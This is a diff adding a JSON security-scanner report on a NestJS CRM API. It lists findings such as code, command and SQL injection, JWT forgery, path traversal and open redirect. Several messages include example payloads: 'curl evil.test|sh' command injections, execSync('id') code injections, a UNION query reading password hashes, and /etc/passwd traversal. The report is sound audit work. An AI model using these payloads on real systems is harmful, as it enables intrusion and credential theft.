@@ -1,0 +1,508 @@
+{
+  "version": "1.0.0",
+  "results": [
+    {
+      "check_id": "javascript.security.injection.code-injection-new-function-weight-formula",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1416,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 1418,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "generateRenewalForecast() builds `new Function('org', `return ${query.weightFormula}`)` directly from the user-supplied ExportQueryDto.weightFormula field and then invokes it for every organization in the report. Any authenticated user calling GET /reports/renewal-forecast?weightFormula=... can supply arbitrary JavaScript that executes inside the Node.js server process, allowing full remote code execution (e.g. `weightFormula=(()=>{require('child_process').execSync('id')})()`). Compare with the safe twin scoreDealPipeline(), which restricts the formula to a fixed allowlist object instead of evaluating user input.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.code-injection-clause-predicate-eval",
+      "path": "apps/api/src/crm/document-index.ts",
+      "start": {
+        "line": 28,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 40,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "ClauseIndex.evaluatePredicate() builds a JavaScript expression by string-substituting into a predicate and running it through `new Function(...)`. The predicate string is constructed by CrmService.findClausesByCategory() as `/clause[@documentId='${documentId}' and @category='${category}']`, where `category` (ClauseSearchDto.category, GET /documents/:id/clauses?category=) is embedded unescaped inside a single-quoted literal. An attacker can close the quote (e.g. `category=x' || (require('child_process').execSync('id'),1)=='1`) to inject arbitrary JavaScript that gets executed via new Function, achieving remote code execution. The sibling findClauseById() escapes its clauseId via escapeXPathString before interpolation, but findClausesByCategory() does not escape category the same way.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-94: Improper Control of Generation of Code ('Code Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-pandoc-format",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 954,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 954,
+        "col": 78,
+        "offset": 0
+      },
+      "extra": {
+        "message": "convertDocumentFormat() runs `execSync(`pandoc ${source} -o ${outputPath} --to=${dto.format}`)` where dto.format (ConvertDocumentDto.format, 2-10 chars, no allowlist) is concatenated directly into a shell command string. A caller can inject shell metacharacters (e.g. `format=pdf;curl+evil.test|sh+#`) to execute arbitrary OS commands. The sibling exportEscalationTranscript() validates format against an allowedFormats allowlist and uses spawnSync with an argument array and shell:false, avoiding injection.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.command-injection-renewal-packet-gen",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 963,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 966,
+        "col": 8,
+        "offset": 0
+      },
+      "extra": {
+        "message": "buildRenewalPacket() runs `exec(`renewal-packet-gen --org \"${organization.name}\" --format ${dto.exportFormat} --out ${outputPath}`)`. dto.exportFormat (RenewalPacketDto.exportFormat, 2-12 chars, no allowlist) is interpolated unquoted into the shell command, and organization.name is only wrapped in double quotes with no escaping, so either field can break out and inject shell commands (e.g. exportFormat=`pdf; curl evil.test|sh #`). The near-identical buildEscalationPacket() validates exportFormat against RENEWAL_PACKET_FORMATS and uses spawnSync with an argument array (shell:false), demonstrating the safe pattern that was skipped here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-78: Improper Neutralization of Special Elements used in an OS Command ('OS Command Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-segment-preview",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 241,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 248,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "previewOrganizationSegment() builds a raw SQL predicate with `qb.andWhere(`org.${field} = '${value}'`)` from OrganizationSegmentDto.criteria, an arbitrary user-controlled Record<string,string>. Neither the field name nor the value is parameterized or allowlisted, so a value like `' OR '1'='1` or a UNION-based payload lets an authenticated PlatformAdmin/AccountManager perform SQL injection against the organizations table. The nearly identical previewQueueSegment() uses an allowedFields allowlist plus TypeORM parameter binding (`:val${index}`), showing the intended safe pattern.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.sql-injection-duplicate-document-lookup",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 878,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 882,
+        "col": 5,
+        "offset": 0
+      },
+      "extra": {
+        "message": "findDuplicateDocumentsByName() executes `this.documents.manager.query(`SELECT id FROM documents WHERE organization_id = '${organizationId}' AND original_name = '${originalName}' AND mime_type = '${mimeType}'`)` with raw string interpolation instead of parameter binding. originalName and mimeType come straight from the uploaded file's client-supplied metadata (Express.Multer.File.originalname/mimetype) in uploadDocument(), so an attacker can name a file `x' UNION SELECT password_hash FROM users--.pdf` to inject SQL. The similar findDuplicateEscalationsByTitle() correctly uses parameterized `$1, $2` placeholders.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.jwt-none-algorithm-unauthenticated-handoff",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1129,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1147,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyDispatchHandoff() verifies the attacker-supplied token with `jsonwebtoken.verify(token, secret || '', { algorithms: ['HS256', 'none'] })`, accepting the 'none' algorithm so a token with header `{\"alg\":\"none\"}` and no signature is accepted as valid. Worse, if verify() throws for any other reason, the catch block falls back to `jsonwebtoken.decode(token)`, which returns the payload with zero signature verification. Because DispatchPartnerController (POST /escalations/:id/dispatch-handoff) has no @UseGuards at all, any unauthenticated caller can forge `{\"agentId\":\"<any-uuid>\"}` and reassign any escalation to any agent. The sibling applyOwnershipHandoff() correctly restricts to `algorithms: ['HS256']` and requires a configured secret, with no unverified fallback.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-347: Improper Verification of Cryptographic Signature",
+            "CWE-287: Improper Authentication"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.missing-authorization-renewal-credit",
+      "path": "apps/api/src/crm/controllers/organizations.controller.ts",
+      "start": {
+        "line": 276,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 279,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "applyRenewalCredit() takes no @CurrentUser() and calls `this.crm.applyRenewalCredit(dealId, dto)`, whose implementation (crm.service.ts lines 1192-1200) directly runs `this.deals.update(dealId, {...})` with no call to policy.requireOrganization or any ownership/role check. Any authenticated user of any role can PATCH /organizations/:id/deals/:dealId/renewal-credit for a deal belonging to an organization they have no access to, modifying valueCents/notes on arbitrary deals (IDOR). The near-duplicate reconcileRenewalCredit() takes @CurrentUser() and calls policy.requireOrganization(user, deal.organizationId, 'manage') before mutating the same fields, showing the intended check was omitted here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-862: Missing Authorization",
+            "CWE-639: Authorization Bypass Through User-Controlled Key"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.deal-memo-read-write",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 511,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 531,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "archiveDealMemo() and getDealMemo() join the user-supplied `dto.memoName` / `memoName` (DealMemoDto.memoName, 1-120 chars, no character restrictions) directly into a filesystem path with `join(orgMemoDir, memoName)` and then write/read it with writeFileSync/fs.readFile, with no basename() or path-containment check. A value like `../../../../etc/cron.d/evil` (write) or `../../../../etc/passwd` (read) escapes orgMemoDir, allowing arbitrary file write or read for any user with 'manage'/'view' access to the parent deal's organization. The sibling archiveEscalationTimeline()/getEscalationTimelineArchive() call `basename(dto.fileName)` before joining, and getComplianceArtifact() additionally verifies the resolved path starts with the target directory \u2014 both patterns are missing here.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.path-traversal.onboarding-playbook-read",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 547,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 553,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "getOnboardingPlaybookArticle() builds `join(orgPlaybookDir, articleName)` from the unsanitized `articleName` query parameter (GET /organizations/:id/onboarding-playbook?articleName=) and reads it with readFileSync, with no basename() call or containment check. A value such as `../../../../etc/passwd` lets any user with 'view' access to the organization read arbitrary files on the server. Compare with getComplianceArtifact() a few lines below, which resolves the path and explicitly checks `artifactPath.startsWith(orgComplianceDir + sep)` before reading.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.upload.branding-logo-unsanitized-filename",
+      "path": "apps/api/src/crm/controllers/organizations.controller.ts",
+      "start": {
+        "line": 89,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 89,
+        "col": 79,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The multer diskStorage filename callback for the branding-logo upload uses the client-supplied `file.originalname` verbatim (`callback(null, file.originalname)`) as the on-disk filename inside the shared `public/branding` directory. A crafted originalname such as `../../../app.module.js` or `../organizations.controller.ts` allows path traversal to write files outside the branding directory, and collisions/overwrites of other tenants' logos are also possible since the name isn't randomized. Every other upload endpoint in this file (deal attachments, deal memos) generates a random/UUID-based filename via randomBytes/randomUUID instead of trusting the client-supplied name.",
+        "severity": "ERROR",
+        "metadata": {
+          "cwe": [
+            "CWE-22: Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authn.unauthenticated-partner-routing-signal",
+      "path": "apps/api/src/crm/controllers/integrations.controller.ts",
+      "start": {
+        "line": 53,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 60,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "DispatchPartnerController has no @UseGuards at all, so POST /escalations/:id/routing-signal is reachable without any authentication. applyRoutingSignal() forwards the raw `x-partner-role` and `x-partner-priority` headers to CrmService.applyPartnerRoutingSignal(), which elevates the escalation's severity to Critical whenever `partnerRole === 'EscalationLead'` and recomputes its SLA due date from the client-supplied priority \u2014 a trust decision based entirely on an unauthenticated, attacker-controlled HTTP header. Any anonymous caller can escalate severity or manipulate SLA timers for any escalation ID.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-306: Missing Authentication for Critical Function",
+            "CWE-290: Authentication Bypass by Spoofing"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.misconfig.cors-reflected-origin-with-credentials",
+      "path": "apps/api/src/crm/controllers/status.controller.ts",
+      "start": {
+        "line": 11,
+        "col": 5,
+        "offset": 0
+      },
+      "end": {
+        "line": 15,
+        "col": 6,
+        "offset": 0
+      },
+      "extra": {
+        "message": "healthBadge() reflects any client-supplied `Origin` header back verbatim into `Access-Control-Allow-Origin` with no allowlist check, and unconditionally sets `Access-Control-Allow-Credentials: true`. This combination lets any arbitrary website make credentialed cross-origin requests to this (unauthenticated) endpoint and, more importantly, establishes an unsafe reflect-origin+credentials pattern in the codebase. WebhookWidgetController.statusBadge() in the same module shows the safe pattern: it only sets Access-Control-Allow-Origin when the Origin matches a fixed PARTNER_WIDGET_ORIGINS allowlist.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-942: Permissive Cross-domain Policy with Untrusted Domains"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.open-redirect.portal-continuation",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1605,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1609,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "resolvePortalContinuation() returns `destination || '/portal/summary'` with no validation of the destination value, and PortalController.continueToDestination() (GET /portal/:token/continue?destination=) passes that value straight to `res.redirect(target)`. A crafted link like `/portal/<validToken>/continue?destination=https://evil.example` redirects the victim to an attacker-controlled site after presenting a legitimate-looking portal URL. The sibling resolveEscalationContinuation() validates destination against a fixed ALLOWED_PORTAL_CONTINUATIONS allowlist before returning it.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-601: URL Redirection to Untrusted Site ('Open Redirect')"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.injection.ldap-injection-staff-directory-search",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1817,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1822,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "searchStaffDirectory() builds the LDAP filter `(cn=*${dto.query}*)` by directly interpolating the user-supplied StaffDirectoryLookupDto.query with no escaping, then passes it to CorporateDirectoryClient.search(). A value containing `)(...)` filter metacharacters lets an attacker alter the search semantics of the directory filter (LDAP filter injection) to broaden results or bypass intended matching. The sibling verifyQueueGroupMembership() escapes its email input with escapeDirectoryFilterValue() (implementing RFC 4515 escaping) before building its filter, which is the safe pattern that was skipped here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-90: Improper Neutralization of Special Elements used in an LDAP Query ('LDAP Injection')"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.authz.mass-assignment-contact-profile-restore",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1247,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1256,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "restoreContactProfile() parses the client-supplied `dto.profileJson` with JSON.parse and applies it directly with `Object.assign(contact, parsed)`, with no field allowlist. A caller with 'manage' access to the contact's organization can set arbitrary Contact entity fields \u2014 including organizationId (moving the contact to a different tenant) or permission (granting itself/another contact 'admin' permission) \u2014 beyond what the intended profile-restore feature should allow. The near-identical restoreDealRecapNote() filters the parsed payload through an explicit allowlist (`['notes']`) before assigning, which is the pattern omitted here.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.crypto.weak-password-hash-sha256",
+      "path": "apps/api/src/auth/auth.service.ts",
+      "start": {
+        "line": 206,
+        "col": 9,
+        "offset": 0
+      },
+      "end": {
+        "line": 206,
+        "col": 68,
+        "offset": 0
+      },
+      "extra": {
+        "message": "initializeAccount() stores the new user's password as `createHash('sha256').update(dto.password).digest('hex')` \u2014 a fast, unsalted, single-round hash \u2014 instead of bcrypt. Every other password-setting path in this file (login checks, updateProfile, confirmPasswordReset, acceptInvite) uses `bcrypt.hash(..., 12)`. Because SHA-256 has no built-in salt and is computationally cheap, credentials created via the account-setup-code flow are far weaker against offline brute-force/rainbow-table attacks than the rest of the system, and a user onboarded this way can never successfully log in via the bcrypt.compare check in login() either.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-916: Use of Password Hash With Insufficient Computational Effort"
+          ],
+          "confidence": "HIGH",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.xxe.dashboard-layout-xml-missing-doctype-guard",
+      "path": "apps/api/src/crm/crm.service.ts",
+      "start": {
+        "line": 1864,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 1875,
+        "col": 4,
+        "offset": 0
+      },
+      "extra": {
+        "message": "parseDashboardLayoutXml() parses attacker-controlled XML (from the `dashboard_layout_xml` cookie, reachable via GET /dashboard/layout-snapshot with no authentication required on that route) using xml2js with no restriction on DOCTYPE/ENTITY declarations. The sibling parseQuietHoursXml(), parsing the same kind of cookie-supplied XML, explicitly rejects any input containing `<!DOCTYPE` before parsing. The missing guard here removes the one defense this codebase otherwise applies against XML entity-expansion attacks (XXE / billion-laughs style DoS) on this parser.",
+        "severity": "WARNING",
+        "metadata": {
+          "cwe": [
+            "CWE-611: Improper Restriction of XML External Entity Reference"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-fallback-jwt-secret",
+      "path": "apps/api/src/auth/jwt.strategy.ts",
+      "start": {
+        "line": 25,
+        "col": 7,
+        "offset": 0
+      },
+      "end": {
+        "line": 25,
+        "col": 76,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The JWT signing/verification secret falls back to the hardcoded literal `'dev-only-change-before-production'` whenever the JWT_SECRET environment variable is unset (mirrored in auth.module.ts). If this default ever reaches a real deployment (e.g. missing env var in a container/orchestration misconfiguration), anyone can forge a valid, arbitrarily-privileged access token (`{sub, email, role: 'platform_admin'}`) using the publicly-known default secret, achieving full authentication bypass.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "MEDIUM",
+          "category": "security"
+        }
+      }
+    },
+    {
+      "check_id": "javascript.security.secrets.hardcoded-fallback-db-password",
+      "path": "apps/api/src/database/data-source.ts",
+      "start": {
+        "line": 27,
+        "col": 3,
+        "offset": 0
+      },
+      "end": {
+        "line": 27,
+        "col": 58,
+        "offset": 0
+      },
+      "extra": {
+        "message": "The Postgres connection falls back to the hardcoded password `'crm_app_dev_password'` when POSTGRES_PASSWORD is not set. Should this default ever be used against a network-reachable database in a non-local environment, it grants a well-known credential full database access.",
+        "severity": "INFO",
+        "metadata": {
+          "cwe": [
+            "CWE-798: Use of Hard-coded Credentials"
+          ],
+          "confidence": "LOW",
+          "category": "security"
+        }
+      }
+    }
+  ]
+}
